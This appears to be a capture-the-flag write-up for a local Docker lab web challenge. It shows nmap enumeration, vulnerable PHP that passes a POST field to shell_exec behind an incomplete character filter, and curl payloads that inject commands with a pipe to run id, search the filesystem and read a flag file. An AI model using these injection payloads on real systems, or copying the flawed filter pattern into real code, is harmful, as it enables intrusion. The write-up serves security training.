# Link Diagnostics

> North substation link diagnostic viewer. Download the lab zip and run it on Kali/Linux with Docker.
> `chmod +x startlab.sh && ./startlab.sh blackout-web04.tar` → lab IP (172.18.0.2). Enumerate with nmap and attack via HTTP.
> **Hint:** enumerate the lab IP with nmap. There is a node diagnostic viewer.

**Flag:** `WHOAMI{cmd1_enlac3_n0rt3}`

---

## Solution

The challenge presents a web application with a diagnostic viewer that runs system commands on the server. The goal is to find and exploit a command injection vulnerability to retrieve the flag.

### 1. Spin up and enumerate

**Tool:** `docker inspect` + `nmap`. **Why:** the startup script does not give a fixed IP, so I query Docker for it; then `nmap` tells me which services are available to attack via HTTP.

**nmap parameters:** `-sV` (service version detection) and `-p-` (scans all 65535 ports, not just the common ones).

```bash
$ unzip blackout-web04.zip && chmod +x startlab.sh && ./startlab.sh blackout-web04.tar
$ sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' blackout-web04
172.17.0.2

$ nmap -sV -p- 172.17.0.2
80/tcp open  http    Apache httpd 2.4.68 (Debian)
```

Only port 80. Since there is only HTTP, the attack will be through that vector.

### 2. Find the diagnostic viewer

Fuzzing/exploring the application reveals `/diagnostico.php`, which offers a "node check": a `host` field sent via POST. Reviewing the endpoint code:

```php
$host = (string) ($_POST['host'] ?? '');
if ($host === '' || preg_match('/[;&`\n\r]/', $host)) {
    $error = '...';
} else {
    $salida = shell_exec('getent ahosts ' . $host . ' 2>&1');
}
```

It executes `getent ahosts <host>` on the shell. The filter blocks `;`, `&`, backticks, and newlines… **but does not block `|`** → **command injection via pipe**.

### 3. Inject with `|`

**Tool:** `curl`. **Why:** it sends arbitrary HTTP requests; here, a POST with the malicious payload in the `host` field.

**Parameters:** `-X POST` sets the method and `-d` sends the form body.

```bash
$ curl -X POST http://172.17.0.2/diagnostico.php -d "host=127.0.0.1|id"
uid=33(www-data) gid=33(www-data)
```

The pipe executes an additional command. **What I saw:** the `|` ran `id` and returned the user `www-data`, confirming the injection. From there, the system was explored looking for the flag:

```bash
$ curl -X POST http://172.17.0.2/diagnostico.php \
    --data-urlencode "host=127.0.0.1|find / -name '*.dat' 2>/dev/null | grep -v proc"
/var/lib/latam/enlace.dat
```

**Decision:** since the challenge is about "link"/telemetry, I searched for `.dat` files (typical data files) and `enlace.dat` appeared.

### 4. Read the file containing the flag

```bash
$ curl -X POST http://172.17.0.2/diagnostico.php \
    --data-urlencode "host=127.0.0.1|cat /var/lib/latam/enlace.dat"
REGISTRO=V0hPQU1Je2NtZDFfZW5sYWMzX24wcnQzfQ==
```

The value ends with `==`, the signature of **base64**:

```bash
$ echo "V0hPQU1Je2NtZDFfZW5sYWMzX24wcnQzfQ==" | base64 -d
WHOAMI{cmd1_enlac3_n0rt3}
```

## Lesson

A field that goes into `shell_exec` is gold. If the filter blocks `;` and `&`, try `|` (pipe): it executes an additional command without needing a terminator. Then explore `/var/lib` or application directories — that is where `.dat` files with base64-encoded flags are often hidden.

---

### Credits

This writeup is part of the **Blackout LATAM** CTF hosted by [Whoami-Labs](https://whoami-labs.com/).
